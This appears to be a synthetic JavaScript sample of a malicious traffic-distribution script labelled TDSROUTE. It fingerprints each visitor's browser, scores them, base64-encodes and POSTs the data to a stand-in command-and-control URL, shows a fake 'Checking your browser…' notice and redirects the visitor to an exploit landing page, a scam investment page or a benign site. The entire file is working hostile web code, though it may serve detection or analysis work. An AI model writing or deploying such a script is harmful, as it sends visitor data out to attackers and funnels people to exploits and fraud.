// TDSROUTE — synthetic traffic-distribution product sample.
(function () {
  var C2 = 'https://c2.example.test/tds';
  var routes = { exploit: 'https://landing.example.test/exploit', scam: 'https://landing.example.test/invest', benign: 'https://benign.example.test/' };
  var visitor = {
    ua: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    timezone: new Date().getTimezoneOffset(),
    referrer: document.referrer || 'direct'
  };
  console.log('[TDSROUTE] visitor', JSON.stringify(visitor));

  function score(v) {
    var value = 0;
    if (/Windows|Macintosh/.test(v.ua)) value += 2;
    if (/^en|^zh|^ru/.test(v.language)) value += 1;
    if (v.timezone % 60 === 0) value += 1;
    return value;
  }

  var value = score(visitor);
  var target = value >= 4 ? routes.exploit : value >= 2 ? routes.scam : routes.benign;
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ visitor: visitor, score: value, target: target })) }).catch(function () {});
  } catch (error) {}
  try {
    var interstitial = document.createElement('div');
    interstitial.textContent = 'Checking your browser…';
    document.body.appendChild(interstitial);
  } catch (error) {}
  try { localStorage.setItem('tds:target', target); } catch (error) {}
  try { location.replace(target + '?src=tds'); } catch (error) {}
  console.log('[TDSROUTE] routed', value, target);
})();
